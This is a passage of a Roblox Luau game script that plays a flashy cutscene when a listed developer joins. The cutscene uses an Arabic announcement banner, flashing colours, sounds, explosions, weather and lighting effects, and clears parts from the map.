    background.Size = UDim2.new(1, 0, 1, 0)

    local text = Instance.new("TextLabel", gui)
    text.Size = UDim2.new(0.1, 0, 0.03, 0)
    text.Position = UDim2.new(0.25, 0, 0.43, 0)
    text.BackgroundTransparency = 1
    text.Text = "المطور [" .. devName .. "] دخل السيرفر!!"
    text.TextColor3 = Color3.new(1, 0, 0)
    text.TextStrokeTransparency = 0.5
    text.TextScaled = true
    text.Font = Enum.Font.Arcade
    text.ZIndex = 5

    local glitch = Instance.new("ImageLabel", gui)
    glitch.Size = UDim2.new(1, 0, 1, 0)
    glitch.BackgroundTransparency = 1
    glitch.Image = "rbxassetid://10974496034"
    glitch.ImageTransparency = 1
    glitch.ZIndex = 4

    local sound = Instance.new("Sound", gui)
    sound.SoundId = "rbxassetid://9120580936"
    sound.Volume = 1
    sound:Play()

    flash.BackgroundTransparency = 0
    TweenService:Create(flash, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
    TweenService:Create(text, TweenInfo.new(0.3, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
        Size = UDim2.new(0.5, 0, 0.12, 0)
    }):Play()

    spawn(function()
        local colors = {
            Color3.new(1, 0, 0),
            Color3.new(1, 1, 0),
            Color3.new(0, 1, 0),
            Color3.new(0, 1, 1),
            Color3.new(1, 0, 1),
        }
        for i = 1, 100 do
            text.TextColor3 = colors[math.random(1, #colors)]
            wait(0.05)
        end
    end)

    spawn(function()
        for i = 1, 15 do
            glitch.ImageTransparency = 0
            wait(0.04)
            glitch.ImageTransparency = 1
            wait(0.04)
        end
    end)

    realisticShake(3.5, 0.6)
    spawnExplosions(player)

    delay(10, function()
        if gui then gui:Destroy() end
    end)

    delay(10, function()
        local rain = Instance.new("ParticleEmitter")
        rain.Texture = "rbxassetid://135962566"
        rain.Size = NumberSequence.new(3, 5)
        rain.Rate = 1000
        rain.Lifetime = NumberRange.new(0.05, 0.3)
        rain.Velocity = NumberRange.new(0, 100)
        rain.Parent = workspace.Terrain

        local thunder = Instance.new("Sound", workspace)
        thunder.SoundId = "rbxassetid://170148297"
        thunder.Volume = 1
        thunder:Play()

        local lightning = Instance.new("PointLight")
        lightning.Name = "TempLightning"
        lightning.Brightness = 50
        lightning.Range = 30
        lightning.Color = Color3.fromRGB(255, 255, 255)
        lightning.Parent = workspace

        Lighting.Brightness = 5
        Lighting.ShadowSoftness = 0.05
        Lighting.Ambient = Color3.fromRGB(25, 25, 25)
        wait(0.1)
        Lighting.Brightness = 4
        Lighting.Ambient = Color3.fromRGB(10, 10, 10)
        Lighting.TimeOfDay = "14:00:00"
    end)

    delay(10, function()
        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                local destroyEffect = Instance.new("Explosion")
                destroyEffect.Position = part.Position
                destroyEffect.BlastRadius = 100
                destroyEffect.BlastPressure = 50000
                destroyEffect.Parent = workspace
            end
        end
    end)

    delay(10, function()
        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                part:Destroy()
            end
        end
    end)

    delay(20, function()
        local soundPsychotic = Instance.new("Sound", workspace)
        soundPsychotic.SoundId = "rbxassetid://204332414"
        soundPsychotic.Volume = 1.5
        soundPsychotic:Play()

        realisticShake(5, 15)

        for _, part in pairs(workspace:GetChildren()) do
            if part:IsA("Part") and part.Name ~= "Baseplate" then
                part:Destroy()
            end
        end

        for i = 1, 20 do
            Lighting.Ambient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
            wait(0.1)
        end
    end)

    delay(20, function()
        local char = player.Character
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = root.CFrame + Vector3.new(0, -50, 0)
                wait(0.5)
                root.CFrame = CFrame.new(root.Position)
            end
        end
    end)

    delay(25, function()
        local screenEffect = Instance.new("ScreenGui", playerGui)
        screenEffect.Name = "ScreenEffect"
        screenEffect.IgnoreGuiInset = true
        local colorFlash = Instance.new("Frame", screenEffect)
        colorFlash.Size = UDim2.new(1, 0, 1, 0)
        colorFlash.BackgroundTransparency = 0
        colorFlash.BackgroundColor3 = Color3.new(1, 1, 1)
        local colors = {Color3.new(1, 0, 0), Color3.new(0, 0, 1), Color3.new(0, 1, 0), Color3.new(1, 1, 0)}
        spawn(function()
            for i = 1, 100 do
                colorFlash.BackgroundColor3 = colors[math.random(1, #colors)]
                wait(0.05)
            end
        end)
        local cuttingSound = Instance.new("Sound", screenEffect)
        cuttingSound.SoundId = "rbxassetid://5387431237"
        cuttingSound.Volume = 1.5
        cuttingSound:Play()
        wait(5)
        screenEffect:Destroy()
    end)

    delay(30, function()
        Lighting.Brightness = originalSettings.Brightness
        Lighting.ShadowSoftness = originalSettings.ShadowSoftness
        Lighting.Ambient = originalSettings.Ambient
        Lighting.TimeOfDay = originalSettings.TimeOfDay
        if Lighting:FindFirstChild("DevBW") then Lighting.DevBW:Destroy() end
        if Lighting:FindFirstChild("DevBlur") then Lighting.DevBlur:Destroy() end
        for _, obj in pairs(workspace:GetChildren()) do
            if obj:IsA("PointLight") and obj.Name == "TempLightning" then
                obj:Destroy()
            end
        end
    end)
end

local function onPlayerAdded(player)
    if developerUsernames[player.Name] then
        triggerScene(player.Name)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)

for _, player in pairs(Players:GetPlayers()) do
    if developerUsernames[player.Name] then
        triggerScene(player.Name)
    end
end
